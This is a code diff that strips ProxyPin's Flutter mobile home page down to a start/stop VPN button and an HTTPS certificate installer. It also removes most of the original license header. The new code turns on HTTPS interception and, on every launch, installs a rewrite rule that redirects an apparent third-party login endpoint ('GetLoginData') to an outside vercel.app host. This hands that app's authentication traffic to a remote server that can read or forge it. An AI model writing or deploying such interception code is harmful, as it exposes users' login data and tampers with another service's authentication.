@@ -1,66 +1,27 @@
 /*
- * Copyright 2023 Hongen Wang All rights reserved.
- *
- * Licensed under the Apache License, Version 2.0 (the "License");
- * you may not use this file except in compliance with the License.
- * You may obtain a copy of the License at
- *
- *      https://www.apache.org/licenses/LICENSE-2.0
- *
- * Unless required by applicable law or agreed to in writing, software
- * distributed under the License is distributed on an "AS IS" BASIS,
- * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
- * See the License for the specific language governing permissions and
- * limitations under the License.
+ * Minimal ProxyPin mobile home: Start/Stop VPN button + preset HTTPS redirect rule.
+ * Replaces lib/ui/mobile/mobile.dart (original: Apache-2.0, Hongen Wang).
  */
 
-import 'dart:async';
-import 'dart:convert';
 import 'dart:io';
+
 import 'package:flutter/material.dart';
-import 'package:flutter/services.dart';
-import 'package:proxypin/l10n/app_localizations.dart';
-import 'package:flutter_toastr/flutter_toastr.dart';
-import 'package:proxypin/native/app_lifecycle.dart';
-import 'package:proxypin/native/pip.dart';
 import 'package:proxypin/native/vpn.dart';
 import 'package:proxypin/network/bin/configuration.dart';
-import 'package:proxypin/network/bin/listener.dart';
 import 'package:proxypin/network/bin/server.dart';
-import 'package:proxypin/network/channel/channel.dart';
-import 'package:proxypin/network/channel/channel_context.dart';
+import 'package:proxypin/network/components/manager/request_rewrite_manager.dart';
+import 'package:proxypin/network/components/manager/rewrite_rule.dart';
 import 'package:proxypin/network/http/http.dart';
-import 'package:proxypin/network/http/websocket.dart';
-import 'package:proxypin/network/http/http_client.dart';
-import 'package:proxypin/mcp/mcp_service.dart';
-import 'package:proxypin/storage/histories.dart';
-import 'package:proxypin/ui/component/memory_cleanup.dart';
 import 'package:proxypin/ui/component/multi_select_controller.dart';
-import 'package:proxypin/ui/component/svg_icon.dart';
-import 'package:proxypin/ui/component/utils.dart';
-import 'package:proxypin/ui/toolbox/toolbox.dart';
 import 'package:proxypin/ui/configuration.dart';
-import 'package:proxypin/ui/content/panel.dart';
 import 'package:proxypin/ui/launch/launch.dart';
-import 'package:proxypin/ui/mobile/menu/drawer.dart';
-import 'package:proxypin/ui/mobile/menu/bottom_navigation.dart';
-import 'package:proxypin/ui/mobile/menu/menu.dart';
-import 'package:proxypin/ui/mobile/request/history.dart';
 import 'package:proxypin/ui/mobile/request/list.dart';
 import 'package:proxypin/ui/mobile/request/search.dart';
-import 'package:proxypin/ui/mobile/widgets/pip.dart';
-import 'package:proxypin/ui/mobile/widgets/remote_device.dart';
+import 'package:proxypin/ui/mobile/setting/ssl.dart';
 import 'package:proxypin/utils/ip.dart';
-import 'package:proxypin/utils/lang.dart';
 import 'package:proxypin/utils/listenable_list.dart';
 import 'package:proxypin/utils/navigator.dart';
 
-import '../app_update/app_update_repository.dart';
-import 'package:proxypin/ui/component/multi_window.dart';
-import 'package:proxypin/ui/mobile/debug/breakpoint_executor.dart';
-
-///移动端首页
-///@author wanghongen
 class MobileHomePage extends StatefulWidget {
   final Configuration configuration;
   final AppConfiguration appConfiguration;
@@ -68,559 +29,98 @@ class MobileHomePage extends StatefulWidget {
   const MobileHomePage(this.configuration, this.appConfiguration, {super.key});
 
   @override
-  State<StatefulWidget> createState() {
-    return MobileHomeState();
-  }
+  State<StatefulWidget> createState() => MobileHomeState();
 }
 
+/// Kept only because other files (menu.dart, pip.dart, mcp.dart ...) still reference these statics.
 class MobileApp {
-  ///请求列表key
   static final GlobalKey<RequestListState> requestStateKey = GlobalKey<RequestListState>();
-
-  ///搜索key
   static final GlobalKey<MobileSearchState> searchStateKey = GlobalKey<MobileSearchState>();
-
-  ///请求列表容器
   static final container = ListenableList<HttpRequest>();
-
   static final multiSelectController = MultiSelectController();
 }
 
-class MobileHomeState extends State<MobileHomePage> implements EventListener, LifecycleListener {
-  /// 选择索引
-  final ValueNotifier<int> _selectIndex = ValueNotifier(0);
+class MobileHomeState extends State<MobileHomePage> {
+  // ================= EDIT THESE =================
+  static const String _ruleName = 'preset-redirect';
 
-  StreamSubscription<HistoryItem>? _remoteHistorySubscription;
+  /// URL pattern to match. `*` is a wildcard.
+  static const String _matchUrl = 'https://loginbp.ppmainecoonghj.com/GetLoginData';
 
-  Route<void>? _pictureInPictureRoute;
+  /// Where to send it. If it also contains `*`, the part matched by the
+  /// wildcard in _matchUrl is carried over (path/query preserved).
+  static const String _targetUrl = 'https://keshavjod-ffi.vercel.app/GetLoginData';
+  // ==============================================
 
   late ProxyServer proxyServer;
-
-  AppLocalizations get localizations => AppLocalizations.of(context)!;
-
-  @override
-  void onRequest(Channel channel, HttpRequest request) {
-    MobileApp.requestStateKey.currentState!.add(channel, request);
-    PictureInPicture.addData(request.requestUrl);
-
-    //监控内存 到达阈值清理
-    MemoryCleanupMonitor.onMonitor(onCleanup: () {
-      MobileApp.requestStateKey.currentState?.cleanupEarlyData(32);
-    });
-  }
-
-  @override
-  void onResponse(ChannelContext channelContext, HttpResponse response) {
-    MobileApp.requestStateKey.currentState!.addResponse(channelContext, response);
-    NetworkTabController.current?.updateResponse(response);
-  }
-
-  @override
-  void onMessage(Channel channel, HttpMessage message, WebSocketFrame frame) {
-    var panel = NetworkTabController.current;
-    if (panel?.request.get() == message || panel?.response.get() == message) {
-      panel?.changeState();
-    }
-  }
 
   @override
   void initState() {
     super.initState();
-
-    AppLifecycleBinding.instance.addListener(this);
+    widget.configuration.enableSsl = true; // HTTPS interception on
     proxyServer = ProxyServer(widget.configuration);
-    proxyServer.addListener(this);
     proxyServer.start();
-    // 启动历史记录任务（单例；原由 ConfigPage 触发，配置页移除后在这里保证初始化）
-    HistoryTask.ensureInstance(widget.configuration, MobileApp.container);
-    _remoteHistorySubscription = HistoryStorage.onRemoteImported.listen((item) => _openHistoryPage(item));
+    _setupRedirect();
+  }
 
-    // MCP 局域网服务：启用时随抓包一起启动，clear_session 同步清空界面列表
-    McpService.instance.clearUiSession = () async {
-      MobileApp.requestStateKey.currentState?.clean();
-    };
-    if (widget.appConfiguration.mcpEnabled) {
-      McpService.instance.attach(proxyServer, existing: MobileApp.container.source);
-      unawaited(McpService.instance.start(widget.appConfiguration).catchError((e) {
-        // 启动失败（如端口/绑定被拒）时持久化关闭，避免每次启动都重复失败
-        widget.appConfiguration.mcpEnabled = false;
-        widget.appConfiguration.flushConfig();
-      }));
+  /// (Re)creates the preset redirect rule on every launch.
+  Future<void> _setupRedirect() async {
+    final manager = await RequestRewriteManager.instance;
+
+    // remove our old copy (highest index first, indexes shift on removal)
+    final old = <int>[];
+    for (var i = 0; i < manager.rules.length; i++) {
+      if (manager.rules[i].name == _ruleName) old.add(i);
     }
+    await manager.removeIndex(old.reversed.toList());
 
-    if (widget.appConfiguration.upgradeNoticeV41) {
-      WidgetsBinding.instance.addPostFrameCallback((_) {
-        showUpgradeNotice();
-      });
-    } else if (Platform.isAndroid) {
-      AppUpdateRepository.checkUpdate(context);
-    }
+    final rule = RequestRewriteRule(type: RuleType.redirect, url: _matchUrl, name: _ruleName);
+    final item = RewriteItem(RewriteType.redirect, true)..redirectUrl = _targetUrl;
+    await manager.addRule(rule, [item]);
+    manager.enabled = true;
+    await manager.flushRequestRewriteConfig();
+  }
 
-    // Handle breakpoint window on mobile
-    MultiWindow.onOpenWindow = (widgetName, args) async {
-      if (widgetName == 'BreakpointExecutor' && args != null) {
-        if (!mounted) return;
-        Navigator.push(
-          context,
-          MaterialPageRoute(
-            builder: (context) => BreakpointExecutor(
-              requestId: args['requestId'],
-              request: HttpRequest.fromJson(jsonDecode(jsonEncode(args['request']))),
-              response:
-                  args['response'] == null ? null : HttpResponse.fromJson(jsonDecode(jsonEncode(args['response']))),
-              isResponse: args['type'] == 'response',
+  @override
+  Widget build(BuildContext context) {
+    final theme = Theme.of(context);
+    return Scaffold(
+      body: SafeArea(
+        child: Center(
+          child: Column(mainAxisSize: MainAxisSize.min, children: [
+            SizedBox(
+              width: 96,
+              height: 96,
+              child: FloatingActionButton(
+                onPressed: null,
+                shape: const CircleBorder(),
+                backgroundColor: theme.colorScheme.primary,
+                child: SocketLaunch(
+                  proxyServer: proxyServer,
+                  size: 44,
+                  startup: proxyServer.configuration.startup,
+                  serverLaunch: false,
+                  onStart: () async {
+                    String host = Platform.isAndroid ? await localIp(readCache: false) : "127.0.0.1";
+                    int port = proxyServer.port;
+                    if (Platform.isIOS) {
+                      await proxyServer.retryBind();
+                    }
+                    Vpn.startVpn(host, port, proxyServer.configuration);
+                  },
+                  onStop: () => Vpn.stopVpn(),
+                ),
+              ),
             ),
-          ),
-        );
-      }
-    };
-  }
-
-  @override
-  void dispose() {
-    AppLifecycleBinding.instance.removeListener(this);
-    _remoteHistorySubscription?.cancel();
-    super.dispose();
-  }
-
-  void toRequestsView(HistoryItem item, HistoryStorage storage) {}
-
-  void _openHistoryPage(HistoryItem item) {
-    _selectIndex.value = 0;
-    WidgetsBinding.instance.addPostFrameCallback((_) {
-      if (!mounted) {
-        return;
-      }
-
-      Navigator.of(context)
-          .push(MaterialPageRoute(
-              builder: (BuildContext context) => HistoryRecord(history: item, proxyServer: proxyServer)))
-          .then((value) async {
-        Future.delayed(const Duration(seconds: 60), () => item.requests = null);
-      });
-    });
-  }
-
-  int exitTime = 0;
-
-  var requestPageNavigatorKey = GlobalKey<NavigatorState>();
-  var configNavigatorKey = GlobalKey<NavigatorState>();
-  var toolboxNavigatorKey = GlobalKey<NavigatorState>();
-  var settingNavigatorKey = GlobalKey<NavigatorState>();
-
-  @override
-  Widget build(BuildContext context) {
-    var navigationView = [
-      NavigatorPage(
-          navigatorKey: requestPageNavigatorKey,
-          child: RequestPage(proxyServer: proxyServer, appConfiguration: widget.appConfiguration)),
-      NavigatorPage(
-          navigatorKey: toolboxNavigatorKey,
-          child: Scaffold(
-              appBar: PreferredSize(
-                  preferredSize: const Size.fromHeight(42),
-                  child: AppBar(
-                      title: Text(localizations.toolbox,
-                          style: const TextStyle(fontSize: 18, fontWeight: FontWeight.w400)),
-                      centerTitle: true)),
-              body: Toolbox(proxyServer: proxyServer))),
-      NavigatorPage(navigatorKey: configNavigatorKey, child: ConfigPage(proxyServer: proxyServer)),
-      NavigatorPage(
-          navigatorKey: settingNavigatorKey,
-          child: SettingPage(proxyServer: proxyServer, appConfiguration: widget.appConfiguration)),
-    ];
-
-    if (!widget.appConfiguration.bottomNavigation) _selectIndex.value = 0;
-
-    return PopScope(
-        canPop: false,
-        onPopInvokedWithResult: (didPop, result) async {
-          if (didPop) {
-            return;
-          }
-
-          if (navigationView[_selectIndex.value].onPopInvoked()) {
-            return;
-          }
-
-          if (await enterPictureInPicture()) {
-            return;
-          }
-
-          if (DateTime.now().millisecondsSinceEpoch - exitTime > 1500) {
-            exitTime = DateTime.now().millisecondsSinceEpoch;
-            if (mounted) {
-              FlutterToastr.show(localizations.appExitTips, this.context,
-                  rootNavigator: true, duration: FlutterToastr.lengthLong);
-            }
-            return;
-          }
-          //退出程序
-          SystemNavigator.pop();
-        },
-        child: ValueListenableBuilder<int>(
-            valueListenable: _selectIndex,
-            builder: (context, index, child) {
-              var theme = Theme.of(context);
-              return Scaffold(
-                  body: IndexedStack(index: index, children: navigationView),
-                  // 实心底导航（放弃毛玻璃：真机上模糊效果不明显，且 extendBody 会引入一系列页尾遮挡问题）
-                  bottomNavigationBar: widget.appConfiguration.bottomNavigation
-                      ? Container(
-                          decoration: BoxDecoration(
-                              color: theme.colorScheme.surface,
-                              border: Border(
-                                  top: BorderSide(color: theme.dividerColor.withValues(alpha: 0.6), width: 0.5))),
-                          child: SafeArea(
-                              top: false,
-                              child: Theme(
-                                data: theme.copyWith(splashColor: Colors.transparent),
-                                child: BottomNavigationBar(
-                                  type: BottomNavigationBarType.fixed,
-                                  backgroundColor: Colors.transparent,
-                                  iconSize: 20,
-                                  // 设计稿 .p-bn：图标 19 + 9px 文字标签
-                                  showSelectedLabels: true,
-                                  showUnselectedLabels: true,
-                                  selectedFontSize: 10,
-                                  unselectedFontSize: 10,
-                                  elevation: 0,
-                                  items: [
-                                    // 设计稿线条 SVG 图标：list / wrench / sliders / gear（工具箱第 2、配置第 3）
-                                    // 与桌面 rail 首项同款标签（设计稿底导航「请求」）
-                                    _navItem(context, 'list', localizations.navRequests, index == 0),
-                                    _navItem(context, 'wrench', localizations.toolbox, index == 1),
-                                    _navItem(context, 'sliders', localizations.config, index == 2),
-                                    _navItem(context, 'gear', localizations.setting, index == 3),
-                                  ],
-                                  currentIndex: _selectIndex.value,
-                                  onTap: (index) => _selectIndex.value = index,
-                                ),
-                              )))
-                      : null);
-            }));
-  }
-
-  /// 底导航项：设计稿线条 SVG 图标，选中主色 / 未选中灰
-  BottomNavigationBarItem _navItem(BuildContext context, String icon, String label, bool selected) {
-    var theme = Theme.of(context);
-    return BottomNavigationBarItem(
-        tooltip: label,
-        icon: SvgIcon(icon,
-            size: 20, color: selected ? theme.colorScheme.primary : theme.colorScheme.onSurfaceVariant),
-        label: label);
-  }
-
-  @override
-  void onUserLeaveHint() {
-    enterPictureInPicture();
-  }
-
-  Future<bool> enterPictureInPicture() async {
-    if (Vpn.isVpnStarted) {
-      if (!Platform.isAndroid || !(await (AppConfiguration.instance)).pipEnabled.value) {
-        return false;
-      }
-
-      List<String>? appList =
-          proxyServer.configuration.appWhitelistEnabled ? proxyServer.configuration.appWhitelist : [];
-      List<String>? disallowApps;
-      if (appList.isEmpty) {
-        disallowApps = proxyServer.configuration.appBlacklist ?? [];
-      }
-
-      return PictureInPicture.enterPictureInPictureMode(
-          Platform.isAndroid ? await localIp() : "127.0.0.1", proxyServer.port,
-          appList: appList, disallowApps: disallowApps, setSystemProxy: proxyServer.configuration.enableSystemProxy);
-    }
-    return false;
-  }
-
-  @override
-  void onPictureInPictureModeChanged(bool isInPictureInPictureMode) {
-    if (isInPictureInPictureMode) {
-      if (_pictureInPictureRoute?.isActive ?? false) return;
-
-      final route = PageRouteBuilder<void>(
-          transitionDuration: Duration.zero,
-          reverseTransitionDuration: Duration.zero,
-          pageBuilder: (context, animation, secondaryAnimation) {
-            return PictureInPictureWindow(MobileApp.container);
-          });
-      _pictureInPictureRoute = route;
-      Navigator.of(context).push(route);
-      return;
-    }
-
-    final route = _pictureInPictureRoute;
-    _pictureInPictureRoute = null;
-    if (route?.isActive ?? false) {
-      // 系统退出画中画时直接移除对应路由，避免 maybePop 检查尚未初始化的 PopScope。
-      Navigator.of(context).removeRoute(route!);
-    }
-    Vpn.isRunning().then((value) {
-      Vpn.isVpnStarted = value;
-      SocketLaunch.startStatus.value = ValueWrap.of(value);
-    });
-  }
-
-  void showUpgradeNotice() {
-    bool isCN = Localizations.localeOf(context) == const Locale.fromSubtags(languageCode: 'zh');
-
-    String content = isCN
-        ? '提示：默认不会开启HTTPS抓包，请安装证书后再开启HTTPS抓包。\n\n'
-            '1. 内置 MCP 服务增强：可自定义监听地址并设置访问令牌保护，支持查看 WebSocket 二进制消息，敏感信息脱敏与工具说明更完善；\n'
-            '2. 十六进制（Hex）查看器浏览大内容更流畅，请求体页签切换后不再丢失浏览位置，并新增格式化文本与 CSS 预览；\n'
-            '3. 历史记录支持多选与全选，可批量管理请求；\n'
-            '4. 新增 AMOLED 纯黑主题；\n'
-            '5. 搜索体验优化，详情中过长的 Cookie 名称会自动换行显示；\n'
-            '6. 修复连接关闭后资源未及时释放导致的占用累积、请求内容偶发显示旧数据等稳定性问题；\n'
-            '7. 优化 Windows 多窗口：窗口在不同缩放比例的显示器之间移动时尺寸不再出错，新窗口打开时不再闪烁；\n'
-            '8. 修复安卓小窗模式下系统代理设置失效、Linux 版打包失败、检查更新偶发失败等问题，并新增更多界面语言。\n'
-        : 'Note: HTTPS capture is disabled by default — please install the certificate before enabling HTTPS capture.\n\n'
-            '1. Improved the built-in MCP server: customizable listen address with access-token protection, binary WebSocket message support, and better sensitive-data redaction and tool documentation;\n'
-            '2. Smoother Hex viewer for large content; body tabs now keep their position when switching, with new formatted-text and CSS preview views;\n'
-            '3. History items support multi-select and select-all for batch management;\n'
-            '4. Added an AMOLED black theme;\n'
-            '5. Smoother search experience; long cookie names now wrap automatically in the details view;\n'
-            '6. Fixed resource buildup after connections close, request content occasionally showing stale data, and other stability issues;\n'
-            '7. Improved Windows multi-window behavior: windows keep the correct size when moved across monitors with different scaling, and no longer flicker when opening;\n'
-            '8. Fixed the system proxy being reset in Android window mode, Linux package builds, and occasional update-check failures; added more UI languages.\n';
-    showAlertDialog(isCN ? '更新内容V${AppConfiguration.version}' : "What's new in V${AppConfiguration.version}", content,
-        () {
-      widget.appConfiguration.upgradeNoticeV41 = false;
-      widget.appConfiguration.flushConfig();
-    });
-  }
-
-  void showAlertDialog(String title, String content, Function onClose) {
-    showDialog(
-        context: context,
-        barrierDismissible: false,
-        builder: (context) {
-          return AlertDialog(
-              scrollable: true,
-              actions: [
-                TextButton(
-                    onPressed: () {
-                      onClose.call();
-                      Navigator.pop(context);
-                    },
-                    child: Text(localizations.close))
-              ],
-              title: Text(title, style: const TextStyle(fontSize: 18)),
-              content: SelectableText(content));
-        });
-  }
-}
-
-class RequestPage extends StatefulWidget {
-  final ProxyServer proxyServer;
-  final AppConfiguration appConfiguration;
-
-  const RequestPage({super.key, required this.proxyServer, required this.appConfiguration});
-
-  @override
-  State<RequestPage> createState() => RequestPageState();
-}
-
-class RequestPageState extends State<RequestPage> {
-  /// 远程连接
-  final ValueNotifier<RemoteModel> remoteDevice = ValueNotifier(RemoteModel(connect: false));
-
-  late ProxyServer proxyServer;
-
-  AppLocalizations get localizations => AppLocalizations.of(context)!;
-
-  @override
-  void initState() {
-    super.initState();
-    proxyServer = widget.proxyServer;
-
-    //远程连接
-    remoteDevice.addListener(() {
-      if (remoteDevice.value.connect) {
-        proxyServer.configuration.remoteHost = "http://${remoteDevice.value.host}:${remoteDevice.value.port}";
-        checkConnectTask(context);
-      } else {
-        proxyServer.configuration.remoteHost = null;
-      }
-    });
-  }
-
-  @override
-  void dispose() {
-    remoteDevice.dispose();
-    super.dispose();
-  }
-
-  @override
-  Widget build(BuildContext context) {
-    return Stack(children: [
-      Scaffold(
-        appBar: _MobileAppBar(widget.appConfiguration, proxyServer, remoteDevice: remoteDevice),
-        drawer: widget.appConfiguration.bottomNavigation
-            ? null
-            : DrawerWidget(proxyServer: proxyServer, container: MobileApp.container),
-        body: ValueListenableBuilder(
-            valueListenable: remoteDevice,
-            builder: (context, value, _) {
-              return Column(children: [
-                value.connect ? remoteConnect(value) : const SizedBox(),
-                Expanded(
-                    child: RequestListWidget(
-                        key: MobileApp.requestStateKey,
-                        proxyServer: proxyServer,
-                        list: MobileApp.container,
-                        selectionController: MobileApp.multiSelectController))
-              ]);
-            }),
+            const SizedBox(height: 24),
+            // Needed once so HTTPS can be decrypted. Delete this button after the cert is installed.
+            TextButton(
+              onPressed: () => navigator(context, MobileSslWidget(proxyServer: proxyServer)),
+              child: const Text('Install HTTPS certificate'),
+            ),
+          ]),
+        ),
       ),
-      PictureInPictureIcon(proxyServer),
-      // FAB 用 Stack 定位在右下（内层 Scaffold 的 floatingActionButton 会与底导航布局冲突）
-      Positioned(right: 16, bottom: 12, child: _launchActionButton()),
-    ]);
-  }
-
-  /// 主题色底，运行中 = 白 ⏹，已停止 = 白 ▶（图标白色由 SocketLaunch 移动端分支绘制）
-  Widget _launchActionButton() {
-    return ValueListenableBuilder<ValueWrap<bool>>(
-        valueListenable: SocketLaunch.startStatus,
-        builder: (context, status, _) {
-          var theme = Theme.of(context);
-          // 46px 正圆右下悬浮（设计稿 .p-fab）；启停统一主题主色，图标恒白，以图标区分状态
-          return SizedBox(
-            width: 46,
-            height: 46,
-            child: FloatingActionButton(
-              onPressed: null,
-              shape: const CircleBorder(),
-              backgroundColor: theme.colorScheme.primary,
-              child: SocketLaunch(
-                proxyServer: proxyServer,
-                size: 22,
-              startup: proxyServer.configuration.startup,
-              serverLaunch: false,
-              onStart: () async {
-                String host = Platform.isAndroid ? await localIp(readCache: false) : "127.0.0.1";
-                int port = proxyServer.port;
-                if (Platform.isIOS) {
-                  await proxyServer.retryBind();
-                }
-
-                if (remoteDevice.value.ipProxy == true) {
-                  host = remoteDevice.value.host!;
-                  port = remoteDevice.value.port!;
-                }
-
-                Vpn.startVpn(host, port, proxyServer.configuration, ipProxy: remoteDevice.value.ipProxy);
-              },
-              onStop: () => Vpn.stopVpn()),
-            ),
-          );
-        });
-  }
-
-  /// 远程连接
-  Widget remoteConnect(RemoteModel value) {
-    return Container(
-        margin: const EdgeInsets.only(top: 5, bottom: 5),
-        height: 56,
-        width: double.infinity,
-        child: ElevatedButton(
-          style: ButtonStyle(
-              shape: WidgetStateProperty.all<RoundedRectangleBorder>(
-                  RoundedRectangleBorder(borderRadius: BorderRadius.circular(8)))),
-          onPressed: () => Navigator.of(context).push(MaterialPageRoute(builder: (BuildContext context) {
-            return RemoteDevicePage(remoteDevice: remoteDevice, proxyServer: proxyServer);
-          })),
-          child: Text(localizations.remoteConnected(remoteDevice.value.os ?? ', ${remoteDevice.value.hostname}'),
-              style: Theme.of(context).textTheme.titleMedium),
-        ));
-  }
-
-  /// 检查远程连接
-  Future<void> checkConnectTask(BuildContext context) async {
-    int retry = 0;
-    Timer.periodic(const Duration(milliseconds: 15000), (timer) async {
-      if (remoteDevice.value.connect == false) {
-        timer.cancel();
-        return;
-      }
-
-      try {
-        var response = await HttpClients.get("http://${remoteDevice.value.host}:${remoteDevice.value.port}/ping")
-            .timeout(const Duration(seconds: 3));
-        if (response.bodyAsString == "pong") {
-          retry = 0;
-          return;
-        }
-      } catch (e) {
-        retry++;
-      }
-
-      if (retry > 3) {
-        if (context.mounted) {
-          ScaffoldMessenger.of(context).removeCurrentSnackBar();
-
-          ScaffoldMessenger.of(context).showSnackBar(SnackBar(
-              content: Text(localizations.remoteConnectDisconnect),
-              action: SnackBarAction(
-                  label: localizations.disconnect,
-                  onPressed: () {
-                    timer.cancel();
-                    remoteDevice.value = RemoteModel(connect: false);
-                  })));
-        }
-      }
-    });
-  }
-}
-
-/// 移动端AppBar
-class _MobileAppBar extends StatelessWidget implements PreferredSizeWidget {
-  final AppConfiguration appConfiguration;
-  final ProxyServer proxyServer;
-  final ValueNotifier<RemoteModel> remoteDevice;
-
-  const _MobileAppBar(this.appConfiguration, this.proxyServer, {required this.remoteDevice});
-
-  Future<void> _onClear(BuildContext context, AppLocalizations localizations) async {
-    if (!appConfiguration.clearConfirm) {
-      MobileApp.requestStateKey.currentState?.clean();
-      return;
-    }
-
-    showConfirmDialog(context, title: localizations.clearConfirm, onConfirm: () {
-      MobileApp.requestStateKey.currentState?.clean();
-    });
-  }
-
-  @override
-  Size get preferredSize => const Size.fromHeight(42);
-
-  @override
-  Widget build(BuildContext context) {
-    AppLocalizations localizations = AppLocalizations.of(context)!;
-    var bottomNavigation = appConfiguration.bottomNavigation;
-
-    return AppBar(
-        leading: bottomNavigation ? const SizedBox() : null,
-        systemOverlayStyle: Platform.isAndroid
-            ? SystemUiOverlayStyle(
-                systemNavigationBarColor: ColorScheme.of(context).surface,
-                statusBarColor: ColorScheme.of(context).surface)
-            : null,
-        title: MobileSearch(
-            key: MobileApp.searchStateKey, onSearch: (val) => MobileApp.requestStateKey.currentState?.search(val)),
-        actions: [
-          IconButton(
-              tooltip: localizations.clear,
-              icon: const Icon(Icons.delete_outline),
-              onPressed: () => _onClear(context, localizations)),
-          const SizedBox(width: 2),
-          MoreMenu(proxyServer: proxyServer, remoteDevice: remoteDevice),
-          const SizedBox(width: 10),
-        ]);
+    );
   }
 }
